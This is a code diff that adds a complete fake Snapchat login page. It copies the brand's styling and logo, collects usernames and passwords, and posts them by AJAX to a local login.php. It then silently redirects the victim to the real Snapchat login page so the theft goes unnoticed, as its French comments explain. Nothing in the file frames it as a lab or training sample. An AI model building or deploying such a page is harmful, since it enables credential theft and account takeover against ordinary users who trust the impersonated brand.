@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        body { background: #FFFC00; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: white; border-radius: 20px; padding: 40px; width: 100%; max-width: 420px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo img { width: 60px; }
+        h1 { text-align: center; font-size: 24px; margin-bottom: 30px; color: #000; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; font-size: 14px; color: #333; margin-bottom: 8px; font-weight: 600; }
+        .input-group input { width: 100%; padding: 14px; border-radius: 12px; border: 2px solid #ddd; font-size: 16px; transition: border 0.3s; }
+        .input-group input:focus { border-color: #FFFC00; outline: none; }
+        .btn { background: #FFFC00; color: #000; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.3s; }
+        .btn:hover { background: #f0e600; }
+        .footer { text-align: center; margin-top: 20px; font-size: 13px; color: #666; }
+        .footer a { color: #333; font-weight: 600; text-decoration: none; }
+        .error { color: #FF0000; font-size: 14px; margin-top: 10px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <!-- Snapchat Ghost Logo -->
+            <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M30 0C13.44 0 0 13.44 0 30C0 46.56 13.44 60 30 60C46.56 60 60 46.56 60 30C60 13.44 46.56 0 30 0ZM30 54C16.77 54 6 43.23 6 30C6 16.77 16.77 6 30 6C43.23 6 54 16.77 54 30C54 43.23 43.23 54 30 54Z" fill="#FFFC00"/>
+                <path d="M30 12C20.07 12 12 20.07 12 30C12 39.93 20.07 48 30 48C39.93 48 48 39.93 48 30C48 20.07 39.93 12 30 12ZM30 42C24.48 42 20 37.52 20 32C20 26.48 24.48 22 30 22C35.52 22 40 26.48 40 32C40 37.52 35.52 42 30 42Z" fill="#000"/>
+            </svg>
+        </div>
+        <h1>Log in to Snapchat</h1>
+        <form id="loginForm" method="POST" action="login.php">
+            <div class="input-group">
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" name="username" required autofocus>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div id="errorMessage" class="error">Invalid credentials. Try again.</div>
+            <button type="submit" class="btn">Log In</button>
+        </form>
+        <div class="footer">
+            <a href="https://accounts.snapchat.com/accounts/password_reset_options" target="_blank">Forgot your password?</a>
+            <br><br>
+            <span>New to Snapchat? <a href="https://accounts.snapchat.com/accounts/signup" target="_blank">Sign Up</a></span>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // On empêche l'envoi classique pour faire notre propre requête AJAX
+
+            const formData = new FormData(this);
+            const errorDiv = document.getElementById('errorMessage');
+
+            // Envoi des données au script PHP
+            fetch('login.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                // Si le serveur répond, on redirige vers la vraie page Snapchat après un court délai
+                setTimeout(() => {
+                    window.location.href = 'https://accounts.snapchat.com/accounts/login?continue=%2Faccounts%2Fwelcome';
+                }, 500); // 0.5 seconde
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                errorDiv.style.display = 'block';
+            });
+        });
+    </script>
+</body>
+</html>
